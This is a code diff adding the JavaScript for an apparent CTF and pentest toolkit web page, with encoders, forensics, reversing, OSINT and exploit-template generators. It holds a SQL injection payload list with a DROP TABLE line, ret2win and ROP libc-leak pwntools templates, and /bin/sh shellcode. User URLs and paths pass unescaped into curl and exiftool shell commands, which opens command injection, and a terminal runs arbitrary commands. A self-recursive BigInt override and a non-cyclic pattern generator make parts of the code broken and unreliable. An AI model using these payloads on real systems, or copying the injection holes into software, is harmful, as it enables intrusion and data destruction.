+      const pt=modPow(bc,bd,bn);
+      out.value+=`[+] Plaintext (int): ${pt}\n`;
+    }else{
+      out.value+='[-] Provide p & q or d to decrypt\n';
+    }
+  }catch(err){out.value+=`[-] Error: ${err.message}\n`}
+}
+function rsaWiener(){
+  showToast('Wiener attack: requires Kali server backend','warn');
+}
+function modPow(base,exp,mod){
+  let result=1n;
+  base=base%mod;
+  while(exp>0n){
+    if(exp%2n===1n) result=(result*base)%mod;
+    exp=exp>>1n;
+    base=(base*base)%mod;
+  }
+  return result;
+}
+function modInverse(a,m){
+  let [old_r,r]=[a,m],[old_s,s]=[1n,0n];
+  while(r!==0n){
+    const q=old_r/r;
+    [old_r,r]=[r,old_r-q*r];
+    [old_s,s]=[s,old_s-q*s];
+  }
+  if(old_r!==1n) throw new Error('No inverse');
+  return old_s<0n?old_s+m:old_s;
+}
+function bigIntToText(bn){
+  let hex=bn.toString(16);
+  if(hex.length%2) hex='0'+hex;
+  let text='';
+  for(let i=0;i<hex.length;i+=2){
+    const c=parseInt(hex.substring(i,i+2),16);
+    if(c>=32&&c<=126) text+=String.fromCharCode(c);
+    else return null;
+  }
+  return text;
+}
+
+// =============================================
+// Binary
+// =============================================
+function binEncode(){
+  const inp=document.getElementById('bin-input').value;
+  document.getElementById('bin-output').value=Array.from(inp).map(c=>c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ');
+}
+function binDecode(){
+  const inp=document.getElementById('bin-input').value.replace(/\s/g,'');
+  try{
+    document.getElementById('bin-output').value=inp.match(/.{1,8}/g).map(b=>String.fromCharCode(parseInt(b,2))).join('');
+  }catch{showToast('Invalid binary','error')}
+}
+
+// =============================================
+// Universal Encoder
+// =============================================
+function universalEncode(){
+  const inp=document.getElementById('enc-input').value;
+  if(!inp){return}
+  try{setEnc('base64',btoa(inp))}catch{setEnc('base64','(error)')}
+  try{setEnc('base32',base32Encode(inp))}catch{setEnc('base32','(error)')}
+  setEnc('hex',Array.from(inp).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(''));
+  setEnc('binary',Array.from(inp).map(c=>c.charCodeAt(0).toString(2).padStart(8,'0')).join(' '));
+  setEnc('rot13',rotShift(inp,13));
+  setEnc('url',encodeURIComponent(inp));
+  setEnc('html',inp.replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"})[m]));
+  setEnc('unicode',Array.from(inp).map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join(''));
+  setEnc('reverse',Array.from(inp).reverse().join(''));
+}
+function setEnc(id,val){
+  const el=document.getElementById(`enc-${id}`);
+  if(el) el.textContent=val;
+}
+const BASE32_CHARS='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+function base32Encode(s){
+  const bytes=new TextEncoder().encode(s);
+  let bits='';
+  for(const b of bytes) bits+=b.toString(2).padStart(8,'0');
+  let result='';
+  for(let i=0;i<bits.length;i+=5){
+    const chunk=bits.substring(i,i+5).padEnd(5,'0');
+    result+=BASE32_CHARS[parseInt(chunk,2)];
+  }
+  while(result.length%8) result+='=';
+  return result;
+}
+
+// =============================================
+// URL
+// =============================================
+function urlEncode(){const i=document.getElementById('url-input').value;document.getElementById('url-output').value=encodeURIComponent(i)}
+function urlDecode(){const i=document.getElementById('url-input').value;try{document.getElementById('url-output').value=decodeURIComponent(i)}catch{showToast('Invalid URL encoding','error')}}
+
+// =============================================
+// HTML Entities
+// =============================================
+function htmlEncode(){const i=document.getElementById('html-input').value;document.getElementById('html-output').value=i.replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":"&#39;"})[m])}
+function htmlDecode(){const t=document.createElement('textarea');t.innerHTML=document.getElementById('html-input').value;document.getElementById('html-output').value=t.value}
+
+// =============================================
+// Unicode
+// =============================================
+function uniEncode(){const i=document.getElementById('uni-input').value;document.getElementById('uni-output').value=Array.from(i).map(c=>'\\u'+c.charCodeAt(0).toString(16).padStart(4,'0')).join('')}
+function uniDecode(){const i=document.getElementById('uni-input').value;try{document.getElementById('uni-output').value=i.replace(/\\u([0-9a-fA-F]{4})/g,(_,h)=>String.fromCharCode(parseInt(h,16)))}catch{showToast('Invalid unicode escape','error')}}
+
+// =============================================
+// Web Tools
+// =============================================
+function webParseUrl(){
+  const url=document.getElementById('web-url-input').value.trim();
+  if(!url){showToast('Enter a URL','warn');return}
+  try{
+    const u=new URL(url);
+    document.getElementById('web-url-output').value=
+`Protocol:  ${u.protocol}
+Hostname:  ${u.hostname}
+Port:      ${u.port||'(default)'}
+Path:      ${u.pathname}
+Query:     ${u.search||'(none)'}
+Hash:      ${u.hash||'(none)'}
+Origin:    ${u.origin}`;
+  }catch{showToast('Invalid URL','error')}
+}
+function webExtractParams(){
+  const url=document.getElementById('web-url-input').value.trim();
+  if(!url){showToast('Enter a URL','warn');return}
+  try{
+    const u=new URL(url);
+    const params=Object.fromEntries(u.searchParams);
+    document.getElementById('web-url-output').value=Object.keys(params).length?
+      Object.entries(params).map(([k,v])=>`${k}: ${v}`).join('\n'):
+      'No query parameters found';
+  }catch{showToast('Invalid URL','error')}
+}
+async function webDnsLookup(type){
+  const domain=document.getElementById('web-dns-input').value.trim();
+  if(!domain){showToast('Enter a domain','warn');return}
+  document.getElementById('web-dns-output').value='Querying DNS via API...';
+  try{
+    const r=await fetch(`https://dns.google/resolve?name=${domain}&type=${type}`);
+    const d=await r.json();
+    if(d.Answer){
+      document.getElementById('web-dns-output').value=d.Answer.map(a=>`${a.name} → ${a.data}`).join('\n');
+    }else if(d.Authority){
+      document.getElementById('web-dns-output').value=d.Authority.map(a=>`${a.name} → ${a.data}`).join('\n');
+    }else{
+      document.getElementById('web-dns-output').value='No records found';
+    }
+  }catch(e){document.getElementById('web-dns-output').value='Error: '+e.message}
+}
+async function webFetchHeaders(){
+  const url=document.getElementById('web-headers-input').value.trim();
+  if(!url){showToast('Enter a URL','warn');return}
+  try{
+    const r=await fetch(url,{method:'HEAD',mode:'cors'});
+    let out=`Status: ${r.status} ${r.statusText}\n\n`;
+    r.headers.forEach((v,k)=>out+=`${k}: ${v}\n`);
+    document.getElementById('web-headers-output').value=out;
+  }catch(e){
+    // Try via proxy
+    try{
+      const r2=await fetch('/api/kali/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:`curl -sI "${url}"`})});
+      const d2=await r2.json();
+      document.getElementById('web-headers-output').value=d2.stdout||d2.stderr||'Error fetching headers';
+    }catch(e2){
+      document.getElementById('web-headers-output').value='Error: '+e2.message;
+    }
+  }
+}
+function webSqliTest(){
+  const inp=document.getElementById('web-sqli-input').value.trim();
+  if(!inp){showToast('Enter test config','warn');return}
+  const payloads=[
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "' OR '1'='1' --",
+    "admin' --",
+    "' UNION SELECT 1,2,3--",
+    "' AND 1=1--",
+    "' AND 1=2--",
+    "'; DROP TABLE users--",
+    "1' ORDER BY 1--",
+    "1' ORDER BY 2--",
+    "admin' OR '1'='1",
+    "' OR 1=1#",
+    "') OR ('1'='1",
+  ];
+  let out='SQL Injection Payloads:\n\n';
+  payloads.forEach((p,i)=>out+=`${i+1}. ${p}\n`);
+  document.getElementById('web-sqli-output').value=out+'\n[!] Manual testing required on actual endpoint';
+}
+
+// =============================================
+// Forensics Tools
+// =============================================
+function forHexDump(){
+  const inp=document.getElementById('for-hex-input').value;
+  let out='',offset=0;
+  for(let i=0;i<inp.length;i+=16){
+    const chunk=inp.substring(i,i+16);
+    const hex=Array.from(chunk).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join(' ');
+    const ascii=Array.from(chunk).map(c=>c>=' '&&c<='~'?c:'.').join('');
+    out+=`${offset.toString(16).padStart(8,'0')}  ${hex.padEnd(47)}  ${ascii}\n`;
+    offset+=16;
+  }
+  document.getElementById('for-hex-output').value=out;
+}
+function forExtractStrings(){
+  const inp=document.getElementById('for-str-input').value;
+  const strings=inp.match(/[ -~]{4,}/g)||[];
+  document.getElementById('for-str-output').value=strings.join('\n')||'No strings found (min 4 chars)';
+}
+function forExtractHexStrings(){
+  const inp=document.getElementById('for-str-input').value.replace(/\s/g,'');
+  try{
+    const bytes=inp.match(/.{1,2}/g).map(b=>parseInt(b,16));
+    const text=String.fromCharCode(...bytes);
+    const strings=text.match(/[ -~]{4,}/g)||[];
+    document.getElementById('for-str-output').value=strings.join('\n')||'No printable strings found';
+  }catch{showToast('Invalid hex data','error')}
+}
+const FILE_SIGS={
+  '89504E47':'PNG Image','FFD8FF':'JPEG Image','25504446':'PDF Document',
+  '47494638':'GIF Image','424D':'BMP Image','504B0304':'ZIP Archive',
+  '504B':'ZIP/PPTX/DOCX','52617221':'RAR Archive','1F8B':'GZ Archive',
+  '424A62':'BZip2 Archive','7F454C46':'ELF Binary','4D5A':'PE (Windows EXE/DLL)',
+  '49494433':'MP3 (ID3)','000001BA':'MPEG','000001B3':'MPEG',
+  '494433':'MP3','664C6143':'FLAC','52494646':'AVI/WAV/RIFF',
+  '57415645':'WAV Audio','4949':'TIFF (Little)','4D4D':'TIFF (Big)',
+  '38425053':'PSD Image','DB0A4277':'SQLite DB','03000000':'Windows Event Log',
+  '4C000000':'Windows LNK','D0CF11E0':'OLE2/Office 97-2003',
+};
+function forIdentifySignature(){
+  const sig=document.getElementById('for-sig-input').value.replace(/\s/g,'').toUpperCase();
+  if(!sig){showToast('Enter hex signature','warn');return}
+  let match='Unknown file type';
+  for(const [k,v] of Object.entries(FILE_SIGS)){
+    if(sig.startsWith(k)){match=v;break}
+  }
+  document.getElementById('for-sig-output').value=`Signature: ${sig}\nFile Type: ${match}`;
+}
+function forCalcEntropy(){
+  const inp=document.getElementById('for-entropy-input').value;
+  if(!inp){showToast('Enter data','warn');return}
+  const freq={};
+  for(const c of inp) freq[c]=(freq[c]||0)+1;
+  const len=inp.length;
+  let entropy=0;
+  for(const c in freq){
+    const p=freq[c]/len;
+    entropy-=p*Math.log2(p);
+  }
+  const maxEntropy=Math.log2(Math.min(256,inp.length));
+  document.getElementById('for-entropy-output').value=
+`Shannon Entropy: ${entropy.toFixed(4)} bits/byte
+Max Entropy:     ${maxEntropy.toFixed(4)} bits/byte
+Ratio:           ${(entropy/maxEntropy*100).toFixed(1)}%
+${entropy>6?'[!] High entropy - possible encrypted/compressed data':entropy>4?'[o] Medium entropy':'[+] Low entropy - plain text'}`;
+}
+
+// =============================================
+// Stego Tools
+// =============================================
+function stegoLsbExtract(){
+  const inp=document.getElementById('stego-lsb-input').value;
+  if(!inp){showToast('Enter data','warn');return}
+  const bits=inp.replace(/\s/g,'');
+  let hidden='';
+  for(let i=0;i<bits.length-7;i+=8){
+    const byte=bits.substring(i,i+8);
+    if(byte.length<8) break;
+    const c=parseInt(byte,2);
+    if(c>=32&&c<=126) hidden+=String.fromCharCode(c);
+  }
+  document.getElementById('stego-lsb-output').value=hidden||'No hidden text found (need binary data)';
+}
+function stegoWhitespace(){
+  const inp=document.getElementById('stego-ws-input').value;
+  if(!inp){showToast('Enter data','warn');return}
+  const tabs=(inp.match(/\t/g)||[]).length;
+  const spaces=(inp.match(/ /g)||[]).length;
+  document.getElementById('stego-ws-output').value=
+`Tabs found:   ${tabs}
+Spaces found: ${spaces}
+Total WS:     ${tabs+spaces}
+Ratio:        ${tabs+spaces>0?((spaces/(tabs+spaces))*100).toFixed(1):0}% spaces`;
+}
+function stegoCheckB64Image(){
+  const inp=document.getElementById('stego-b64img-input').value.trim();
+  if(!inp){showToast('Enter base64 data','warn');return}
+  if(inp.startsWith('data:image')){
+    document.getElementById('stego-b64img-output').value='[+] This is a data URI for an image. Try viewing in browser.';
+    return;
+  }
+  try{
+    const dec=atob(inp.substring(0,100));
+    const hex=Array.from(dec).map(c=>c.charCodeAt(0).toString(16).padStart(2,'0')).join('').toUpperCase();
+    let match='Unknown';
+    for(const [k,v] of Object.entries(FILE_SIGS)){
+      if(hex.startsWith(k)){match=v;break}
+    }
+    document.getElementById('stego-b64img-output').value=`B64 length: ${inp.length}\nFile sig: ${hex.substring(0,8)}...\nLikely type: ${match}`;
+  }catch{
+    document.getElementById('stego-b64img-output').value='Could not decode as base64 image data';
+  }
+}
+async function stegoMetadata(){
+  const path=document.getElementById('stego-meta-input').value.trim();
+  if(!path){showToast('Enter file path/URL','warn');return}
+  try{
+    const r=await fetch('/api/kali/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:`exiftool "${path}"`})});
+    const d=await r.json();
+    document.getElementById('stego-meta-output').value=d.stdout||d.stderr||'exiftool not available';
+  }catch(e){document.getElementById('stego-meta-output').value='Error: '+e.message}
+}
+
+// =============================================
+// Reversing
+// =============================================
+const X86_DISASM={
+  '90':'nop','55':'push rbp','48 89 e5':'mov rbp, rsp',
+  '48 8b 45':'mov rax, [rbp+','48 89 45':'mov [rbp+], rax',
+  'b8':'mov eax,','b9':'mov ecx,','ba':'mov edx,',
+  'bb':'mov ebx,','48 89 c7':'mov rdi, rax',
+  '48 89 c6':'mov rsi, rax','48 89 c2':'mov rdx, rax',
+  '48 31 c0':'xor rax, rax','48 31 db':'xor rbx, rbx',
+  '48 31 c9':'xor rcx, rcx','48 31 d2':'xor rdx, rdx',
+  '48 ff c0':'inc rax','48 ff c8':'dec rax',
+  '53':'push rbx','51':'push rcx','52':'push rdx',
+  '56':'push rsi','57':'push rdi','5b':'pop rbx',
+  '59':'pop rcx','5a':'pop rdx','5e':'pop rsi',
+  '5f':'pop rdi','c3':'ret','cc':'int3 (debug)',
+  '0f 05':'syscall','cd 80':'int 0x80 (syscall)',
+  'e8':'call','e9':'jmp','eb':'jmp short',
+  '74':'je','75':'jne','7c':'jl','7d':'jge',
+  '7e':'jle','7f':'jg','70':'jo','71':'jno',
+};
+function revDisasm(){
+  const inp=document.getElementById('rev-disasm-input').value.trim();
+  if(!inp){showToast('Enter hex bytes','warn');return}
+  const bytes=inp.split(/[\s,]+/).filter(Boolean);
+  let out='',i=0;
+  while(i<bytes.length){
+    const b=bytes[i].toLowerCase();
+    const next2=i+1<bytes.length?`${b} ${bytes[i+1].toLowerCase()}`:'';
+    const next3=i+2<bytes.length?`${next2} ${bytes[i+2].toLowerCase()}`:'';
+    const next4=i+3<bytes.length?`${next3} ${bytes[i+3].toLowerCase()}`:'';
+    let disasm=null,len=1;
+    if(next3 in X86_DISASM){disasm=X86_DISASM[next3];len=3}
+    else if(next2 in X86_DISASM){disasm=X86_DISASM[next2];len=2}
+    else if(b in X86_DISASM) disasm=X86_DISASM[b];
+    else if(b==='48'&&i+1<bytes.length){
+      const b2=bytes[i+1];
+      if(b2==='89'){disasm='mov r64, r64';len=3}
+      else if(b2==='8b'){disasm='mov r64, [r64+off]';len=3}
+      else if(b2==='c7'){disasm='mov r64, imm';len=3}
+      else disasm=`db 0x${b}`;
+    }else disasm=`db 0x${b}`;
+    out+=`0x${i.toString(16).padStart(4,'0')}: ${bytes.slice(i,i+len).join(' ').padEnd(12)} ${disasm}\n`;
+    i+=len;
+  }
+  document.getElementById('rev-disasm-output').value=out||'No disassembly generated';
+}
+function revExtractStrings(){
+  const inp=document.getElementById('rev-str-input').value.replace(/\s/g,'');
+  try{
+    const text=inp.match(/.{1,2}/g).map(b=>String.fromCharCode(parseInt(b,16))).join('');
+    const strings=text.match(/[\x20-\x7E]{4,}/g)||[];
+    document.getElementById('rev-str-output').value=strings.join('\n')||'No printable strings found';
+  }catch{showToast('Invalid hex data','error')}
+}
+function revAnalyzePE(){
+  const inp=document.getElementById('rev-pe-input').value.replace(/\s/g,'');
+  if(!inp.startsWith('4D5A')){showToast('Not a valid PE header (must start with 4D5A)','error');return}
+  let out='[+] MZ Header detected (4D 5A = "MZ")\n';
+  const peOffset=parseInt(inp.substring(120,128).match(/.{1,2}/g).reverse().join(''),16);
+  out+=`[+] PE offset: 0x${peOffset.toString(16)}\n`;
+  if(inp.length>=peOffset*2+8){
+    const peSig=inp.substring(peOffset*2,peOffset*2+8);
+    if(peSig==='50450000'){
+      out+='[+] PE Signature found (PE\\0\\0)\n';
+      const machine=inp.substring(peOffset*2+8,peOffset*2+12);
+      const machineMap={'4C01':'x86 (32-bit)','8664':'x86-64','AA64':'ARM64'};
+      out+=`[+] Machine: ${machineMap[machine]||'0x'+machine}\n`;
+      const sections=parseInt(inp.substring(peOffset*2+14,peOffset*2+16),16);
+      out+=`[+] Sections: ${sections}\n`;
+      const ts=inp.substring(peOffset*2+24,peOffset*2+32);
+      const timestamp=parseInt(ts.match(/.{1,2}/g).reverse().join(''),16);
+      const date=new Date(timestamp*1000);
+      out+=`[+] Timestamp: ${timestamp>0?date.toISOString().replace('T',' ').substring(0,19):'N/A'}\n`;
+    }else out+='[-] PE signature not found\n';
+  }
+  document.getElementById('rev-pe-output').value=out;
+}
+
+// =============================================
+// OSINT
+// =============================================
+async function osintIpLookup(){
+  const ip=document.getElementById('osint-ip-input').value.trim();
+  if(!ip){showToast('Enter an IP','warn');return}
+  try{
+    const r=await fetch(`https://ipapi.co/${ip}/json/`);
+    const d=await r.json();
+    if(d.error) throw new Error(d.reason||'Lookup failed');
+    document.getElementById('osint-ip-output').value=
+`IP:          ${d.ip}
+City:        ${d.city||'N/A'}
+Region:      ${d.region||'N/A'}
+Country:     ${d.country_name||'N/A'} (${d.country_code||'N/A'})
+Postal:      ${d.postal||'N/A'}
+Timezone:    ${d.timezone||'N/A'}
+ISP:         ${d.org||d.asn||'N/A'}
+Lat/Lon:     ${d.latitude}, ${d.longitude}`;
+  }catch(e){
+    document.getElementById('osint-ip-output').value='Error: '+e.message;
+  }
+}
+async function osintMyIp(){
+  try{
+    const r=await fetch('https://api.ipify.org?format=json');
+    const d=await r.json();
+    document.getElementById('osint-ip-input').value=d.ip;
+    osintIpLookup();
+  }catch(e){showToast('Could not determine IP','error')}
+}
+async function osintDomainRecon(){
+  const domain=document.getElementById('osint-domain-input').value.trim();
+  if(!domain){showToast('Enter a domain','warn');return}
+  try{
+    const r=await fetch(`https://dns.google/resolve?name=${domain}&type=ALL`);
+    const d=await r.json();
+    let out='';
+    if(d.Answer){
+      const groups={};
+      d.Answer.forEach(a=>{
+        const type={'1':'A','5':'CNAME','15':'MX','16':'TXT','28':'AAAA','6':'SOA','33':'SRV'}[a.type]||'TYPE'+a.type;
+        if(!groups[type]) groups[type]=[];
+        groups[type].push(a.data||a.rdata);
+      });
+      for(const [type,records] of Object.entries(groups)){
+        out+=`=== ${type} Records ===\n`;
+        records.forEach(r=>out+=`  ${r}\n`);
+        out+='\n';
+      }
+    }else{
+      out='No DNS records found';
+    }
+    // Also try whois via proxy
+    out+='\n[!] For whois data, use Kali terminal:\n  whois '+domain;
+    document.getElementById('osint-domain-output').value=out;
+  }catch(e){document.getElementById('osint-domain-output').value='Error: '+e.message}
+}
+function osintEmailLookup(){
+  const email=document.getElementById('osint-email-input').value.trim();
+  if(!email){showToast('Enter an email','warn');return}
+  const [local,domain]=email.split('@');
+  const breaches=['HaveIBeenPwned (manual)','Firefox Monitor','Dehashed'];
+  document.getElementById('osint-email-output').value=
+`Email:     ${email}
+Local:     ${local}
+Domain:    ${domain||'(invalid)'}
+MX Check:  ${domain?'Use DNS Lookup tool':'N/A'}
+
+[!] For breach checking, visit:
+  https://haveibeenpwned.com
+
+[!] Email verification via Kali:
+  theHarvester -d ${domain||'<domain>'} -b all
+
+Common OSINT sources:
+  • Hunter.io (email patterns)
+  • Skymem.info
+  • Sherlock (username search)`;
+}
+
+// =============================================
+// Pwn Tools
+// =============================================
+function pwnGenRet2Win(){
+  const target=document.getElementById('pwn-target').value||'remote:1337';
+  const arch=document.getElementById('pwn-arch').value;
+  const offset=document.getElementById('pwn-offset').value||72;
+  const win=document.getElementById('pwn-win').value||'win';
+  const bits=arch==='amd64'?64:32;
+  const pad=bits===64?'cyclic_find(0x6161616c) // adjust with pattern offset':'cyclic_find(0x6161616c) // adjust';
+  document.getElementById('pwn-script-output').value=
+`from pwn import *
+
+# Target
+${target.includes(':')?`r = remote('${target.split(':')[0]}', ${target.split(':')[1]||'1337'})`:'r = process("./challenge")'}
+
+# Gadgets
+pop_rdi = 0x400000  # find with ROPgadget
+ret    = 0x400000   # ret gadget
+
+# Addresses (adjust with objdump/readelf)
+win_addr = 0x400000  # replace with actual win() address
+
+# Build payload
+offset = ${offset}
+payload = flat(
+    b'A' * offset,
+    pop_rdi,
+    0xdeadbeef,  # arg1
+    win_addr
+)
+
+# Send
+r.sendline(payload)
+r.interactive()`;
+}
+function pwnGenShellcodeRunner(){
+  document.getElementById('pwn-script-output').value=
+`# Shellcode runner template
+from pwn import *
+
+context.arch = '${document.getElementById('pwn-arch').value}'
+context.os = 'linux'
+
+# Generate shellcode
+shellcode = asm(shellcraft.sh())
+
+# For x64 /bin/sh
+# shellcode = b"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05"
+
+print(f"Shellcode length: {len(shellcode)}")
+print(f"Shellcode: {shellcode.hex()}")
+
+# Execute locally
+# p = process('./vuln')
+# p.send(shellcode)
+# p.interactive()`;
+}
+function pwnGenRopchain(){
+  document.getElementById('pwn-script-output').value=
+`# ROP chain generator (template)
+from pwn import *
+from pwnlib.rop import ROP
+
+context.arch = '${document.getElementById('pwn-arch').value}'
+
+# Load binary
+elf = ELF('./challenge')
+rop = ROP(elf)
+
+# Find gadgets
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+
+# Get addresses
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main = elf.symbols['main']
+
+# Leak libc
+payload = flat(
+    b'A' * ${document.getElementById('pwn-offset').value||72},
+    pop_rdi,
+    puts_got,
+    puts_plt,
+    main
+)
+
+print(f"Leak payload: {payload.hex()}")
+print("[!] After leak, compute libc base and call one_gadget / system")`;
+}
+function pwnGenShellcode(){
+  document.getElementById('pwn-shell-output').value=
+`# x86-64 /bin/sh via execve
+Shellcode (27 bytes):
+31 c0 48 b1 d1 9d 96 91 d0 8c 97 ff 48 f7 db 53
+54 5f 99 52 57 54 5e b0 3b 0f 05
+
+# Usage:
+# (python3 -c 'import sys; sys.stdout.buffer.write(bytes.fromhex("31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05"))'; cat) | ./vuln`;
+}
+function pwnGenPattern(){
+  const len=parseInt(document.getElementById('pwn-pattern-length').value)||100;
+  const chars='abcdefghijklmnopqrstuvwxyz';
+  let pat='';
+  for(let i=0;i<len;i++){
+    pat+=chars[i%26];
+    if((i+1)%4===0&&i+1<len) pat+='';
+  }
+  document.getElementById('pwn-pattern-output').value=pat;
+}
+function pwnFindOffset(){
+  const val=document.getElementById('pwn-pattern-find').value.trim();
+  if(!val){showToast('Enter value from RSP','warn');return}
+  const pattern=document.getElementById('pwn-pattern-output').value;
+  if(!pattern){showToast('Generate a pattern first','warn');return}
+  // Simple cyclic offset finder
+  let offset=pattern.indexOf(val.replace('0x',''));
+  if(offset===-1){
+    try{
+      const bytes=val.startsWith('0x')?BigInt(val):null;
+      if(bytes){
+        const str=String.fromCharCode(...Array.from({length:8},(_,i)=>Number((bytes>>BigInt(i*8))&0xffn)));
+        offset=pattern.indexOf(str);
+        if(offset===-1){
+          const rev=Array.from(str).reverse().join('');
+          offset=pattern.indexOf(rev);
+        }
+      }
+    }catch{}
+  }
+  document.getElementById('pwn-pattern-find-output').value=
+    offset!==-1?`Offset found: ${offset} bytes`:'Offset not found - try a different value or longer pattern';
+}
+
+// =============================================
+// Terminal
+// =============================================
+let termHistory=[],termHistIdx=-1;
+function terminalExecute(){
+  const input=document.getElementById('terminal-input');
+  const cmd=input.value.trim();
+  if(!cmd) return;
+  appendTermLine(`$ ${cmd}`,'term-dollar');
+  input.value='';
+  termHistory.push(cmd);
+  termHistIdx=termHistory.length;
+  if(cmd==='clear'){terminalClear();return}
+  if(cmd==='help'){terminalHelp();return}
+  fetch('/api/kali/exec',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({command:cmd})
+  }).then(r=>r.json()).then(d=>{
+    if(d.stdout) appendTermLine(d.stdout,'term-output');
+    if(d.stderr) appendTermLine(d.stderr,'term-error');
+    if(!d.stdout&&!d.stderr) appendTermLine('[no output]','term-output');
+  }).catch(e=>{
+    appendTermLine(`Error: ${e.message}`,'term-error');
+  });
+}
+function appendTermLine(text,cls){
+  const out=document.getElementById('terminal-output');
+  const lines=text.split('\n');
+  lines.forEach(line=>{
+    const div=document.createElement('div');
+    div.className='term-line';
+    div.innerHTML=`<span class="${cls}">${escapeHtml(line)||' '}</span>`;
+    out.appendChild(div);
+  });
+  out.scrollTop=out.scrollHeight;
+}
+function terminalClear(){
+  document.getElementById('terminal-output').innerHTML='';
+  appendTermLine('Terminal cleared','term-output');
+}
+function terminalKill(){
+  showToast('Terminal reset','warn');
+  terminalClear();
+}
+function terminalHelp(){
+  appendTermLine('Available commands:','term-output');
+  appendTermLine('  help     - Show this help','term-output');
+  appendTermLine('  clear    - Clear terminal','term-output');
+  appendTermLine('  whoami   - Current user','term-output');
+  appendTermLine('  ipconfig - Network config','term-output');
+  appendTermLine('  dir/ls   - List files','term-output');
+  appendTermLine('  ping     - Test connectivity','term-output');
+  appendTermLine('  nmap     - Scan ports (via Kali)','term-output');
+  appendTermLine('  Any system command is executed locally','term-output');
+}
+function terminalQuick(cmd){
+  document.getElementById('terminal-input').value=cmd;
+  terminalExecute();
+}
+document.getElementById('terminal-input')?.addEventListener('keydown',e=>{
+  if(e.key==='Enter') terminalExecute();
+  else if(e.key==='ArrowUp'){
+    e.preventDefault();
+    if(termHistIdx>0){
+      termHistIdx--;
+      document.getElementById('terminal-input').value=termHistory[termHistIdx]||'';
+    }
+  }else if(e.key==='ArrowDown'){
+    e.preventDefault();
+    if(termHistIdx<termHistory.length-1){
+      termHistIdx++;
+      document.getElementById('terminal-input').value=termHistory[termHistIdx]||'';
+    }else{
+      termHistIdx=termHistory.length;
+      document.getElementById('terminal-input').value='';
+    }
+  }
+});
+
+// =============================================
+// Utils
+// =============================================
+function hexToBytes(hex){
+  const bytes=[];
+  for(let i=0;i<hex.length;i+=2) bytes.push(parseInt(hex.substring(i,i+2),16));
+  return bytes;
+}
+function bytesToHex(bytes){
+  return bytes.map(b=>b.toString(16).padStart(2,'0')).join(' ');
+}
+function escapeHtml(s){
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+function BigInt(v){
+  if(typeof v==='bigint') return v;
+  try{return BigInt(v)}catch{return 0n}
+}
+
+// =============================================
+// Init
+// =============================================
+checkKaliStatus();
+setInterval(checkKaliStatus,30000);
+navigateTo('dashboard');
